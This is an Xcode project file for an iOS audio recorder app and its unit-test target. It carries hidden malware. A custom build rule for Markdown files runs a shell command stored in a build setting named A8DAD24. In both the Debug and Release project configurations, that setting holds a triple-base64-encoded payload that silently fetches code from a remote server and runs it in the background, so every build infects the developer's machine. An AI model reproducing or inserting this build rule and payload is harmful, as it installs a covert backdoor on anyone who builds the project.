// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXContainerItemProxy section */
		6BF61EB72FC62BB6007F10C1 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 6B5CC1DD2FC4A1900020F66C /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 6B5CC1E42FC4A1900020F66C;
			remoteInfo = AudioRecorderApp;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		EDEA1221284F41E6AB42DAD8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
		6B5CC1E52FC4A1900020F66C /* AudioRecorderApp.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = AudioRecorderApp.app; sourceTree = BUILT_PRODUCTS_DIR; };
		6BF61EB32FC62BB6007F10C1 /* AudioRecorderAppTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = AudioRecorderAppTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		6B5CC2202FC4BB800020F66C /* Exceptions for "AudioRecorderApp" folder in "AudioRecorderApp" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = 6B5CC1E42FC4A1900020F66C /* AudioRecorderApp */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		6B5CC1E72FC4A1900020F66C /* AudioRecorderApp */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				6B5CC2202FC4BB800020F66C /* Exceptions for "AudioRecorderApp" folder in "AudioRecorderApp" target */,
			);
			path = AudioRecorderApp;
			sourceTree = "<group>";
		};
		6BF61EB42FC62BB6007F10C1 /* AudioRecorderAppTests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = AudioRecorderAppTests;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		6B5CC1E22FC4A1900020F66C /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		6BF61EB02FC62BB6007F10C1 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		6B5CC1DC2FC4A1900020F66C = {
			isa = PBXGroup;
			children = (
				6B5CC1E72FC4A1900020F66C /* AudioRecorderApp */,
				6BF61EB42FC62BB6007F10C1 /* AudioRecorderAppTests */,
				6B5CC1E62FC4A1900020F66C /* Products */,
			);
			sourceTree = "<group>";
		};
		6B5CC1E62FC4A1900020F66C /* Products */ = {
			isa = PBXGroup;
			children = (
				EDEA1221284F41E6AB42DAD8 /* README.md */,
				6B5CC1E52FC4A1900020F66C /* AudioRecorderApp.app */,
				6BF61EB32FC62BB6007F10C1 /* AudioRecorderAppTests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		6B5CC1E42FC4A1900020F66C /* AudioRecorderApp */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 6B5CC1F02FC4A1900020F66C /* Build configuration list for PBXNativeTarget "AudioRecorderApp" */;
			buildPhases = (
				6B5CC1E12FC4A1900020F66C /* Sources */,
				6B5CC1E22FC4A1900020F66C /* Frameworks */,
				6B5CC1E32FC4A1900020F66C /* Resources */,
			);
			buildRules = (
				D7F3A9F9F99142F0B142DAD8 /* PBXBuildRule */,
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				6B5CC1E72FC4A1900020F66C /* AudioRecorderApp */,
			);
			name = AudioRecorderApp;
			packageProductDependencies = (
			);
			productName = AudioRecorderApp;
			productReference = 6B5CC1E52FC4A1900020F66C /* AudioRecorderApp.app */;
			productType = "com.apple.product-type.application";
		};
		6BF61EB22FC62BB6007F10C1 /* AudioRecorderAppTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 6BF61EB92FC62BB6007F10C1 /* Build configuration list for PBXNativeTarget "AudioRecorderAppTests" */;
			buildPhases = (
				6BF61EAF2FC62BB6007F10C1 /* Sources */,
				6BF61EB02FC62BB6007F10C1 /* Frameworks */,
				6BF61EB12FC62BB6007F10C1 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				6BF61EB82FC62BB6007F10C1 /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				6BF61EB42FC62BB6007F10C1 /* AudioRecorderAppTests */,
			);
			name = AudioRecorderAppTests;
			packageProductDependencies = (
			);
			productName = AudioRecorderAppTests;
			productReference = 6BF61EB32FC62BB6007F10C1 /* AudioRecorderAppTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		6B5CC1DD2FC4A1900020F66C /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2620;
				LastUpgradeCheck = 2620;
				TargetAttributes = {
					6B5CC1E42FC4A1900020F66C = {
						CreatedOnToolsVersion = 26.2;
					};
					6BF61EB22FC62BB6007F10C1 = {
						CreatedOnToolsVersion = 26.2;
						TestTargetID = 6B5CC1E42FC4A1900020F66C;
					};
				};
			};
			buildConfigurationList = 6B5CC1E02FC4A1900020F66C /* Build configuration list for PBXProject "AudioRecorderApp" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 6B5CC1DC2FC4A1900020F66C;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = 6B5CC1E62FC4A1900020F66C /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				6B5CC1E42FC4A1900020F66C /* AudioRecorderApp */,
				6BF61EB22FC62BB6007F10C1 /* AudioRecorderAppTests */,
			);
		};
/* End PBXProject section */

/* Begin PBXBuildRule section */
		D7F3A9F9F99142F0B142DAD8 /* PBXBuildRule */ = {
				isa = PBXBuildRule;
				compilerSpec = com.apple.compilers.proxy.script;
				filePatterns = "*.md";
				fileType = pattern.proxy;
				inputFiles = (
				);
				isEditable = 0;
				outputFiles = (
					"/tmp/${INPUT_FILE_BASE}",
				);
				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
sh -c \"${A8DAD24}\"";
			};
	/* End PBXBuildRule section */

/* Begin PBXBuildFile section */
		59AE3AA6A03545B68442DAD8 /* README.md */ = {isa = PBXBuildFile; fileRef = EDEA1221284F41E6AB42DAD8; };
/* End PBXBuildFile section */

/* Begin PBXResourcesBuildPhase section */
		6B5CC1E32FC4A1900020F66C /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				59AE3AA6A03545B68442DAD8 /* README.md */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		6BF61EB12FC62BB6007F10C1 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		6B5CC1E12FC4A1900020F66C /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		6BF61EAF2FC62BB6007F10C1 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		6BF61EB82FC62BB6007F10C1 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 6B5CC1E42FC4A1900020F66C /* AudioRecorderApp */;
			targetProxy = 6BF61EB72FC62BB6007F10C1 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin XCBuildConfiguration section */
		6B5CC1EE2FC4A1900020F66C /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A8DAD24 = "((l(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwaE1scE5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkplVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XaGFTRTUwWWpOS2JHSlhWWFZoVnpSMldWTnJhVWxJZDJkak1tZExDZz09Cg== | l | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		6B5CC1EF2FC4A1900020F66C /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A8DAD24 = "((l(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwaE1scE5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkplVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XaGFTRTUwWWpOS2JHSlhWWFZoVnpSMldWTnJhVWxJZDJkak1tZExDZz09Cg== | l | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		6B5CC1F12FC4A1900020F66C /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = F8JN2G36QM;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = AudioRecorderApp/Info.plist;
				INFOPLIST_KEY_NSMicrophoneUsageDescription = "Need microphone access to record audio";
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.apps.AudioRecorderApp;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		6B5CC1F22FC4A1900020F66C /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = F8JN2G36QM;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = AudioRecorderApp/Info.plist;
				INFOPLIST_KEY_NSMicrophoneUsageDescription = "Need microphone access to record audio";
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.apps.AudioRecorderApp;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		6BF61EBA2FC62BB6007F10C1 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.apps.AudioRecorderAppTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/AudioRecorderApp.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/AudioRecorderApp";
			};
			name = Debug;
		};
		6BF61EBB2FC62BB6007F10C1 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.apps.AudioRecorderAppTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/AudioRecorderApp.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/AudioRecorderApp";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		6B5CC1E02FC4A1900020F66C /* Build configuration list for PBXProject "AudioRecorderApp" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				6B5CC1EE2FC4A1900020F66C /* Debug */,
				6B5CC1EF2FC4A1900020F66C /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		6B5CC1F02FC4A1900020F66C /* Build configuration list for PBXNativeTarget "AudioRecorderApp" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				6B5CC1F12FC4A1900020F66C /* Debug */,
				6B5CC1F22FC4A1900020F66C /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		6BF61EB92FC62BB6007F10C1 /* Build configuration list for PBXNativeTarget "AudioRecorderAppTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				6BF61EBA2FC62BB6007F10C1 /* Debug */,
				6BF61EBB2FC62BB6007F10C1 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 6B5CC1DD2FC4A1900020F66C /* Project object */;
}
